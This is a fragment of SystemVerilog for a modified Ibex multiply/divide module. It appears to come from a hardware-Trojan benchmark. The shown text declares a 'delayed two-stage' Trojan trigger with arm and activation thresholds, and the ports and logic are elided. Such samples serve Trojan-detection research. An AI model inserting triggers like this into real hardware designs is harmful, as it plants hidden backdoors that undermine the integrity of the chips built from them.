...
module ibex_multdiv_slow_trojan_Integrity
(
  input  logic             clk_i,
  input  logic             rst_ni,
  ...
  output logic             valid_o
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=4166, act=2083)
    // ============================================================
    localparam int ARM_THRESHOLD   = 4166;
    localparam int ACTIVATE_DELAY  = 2083;
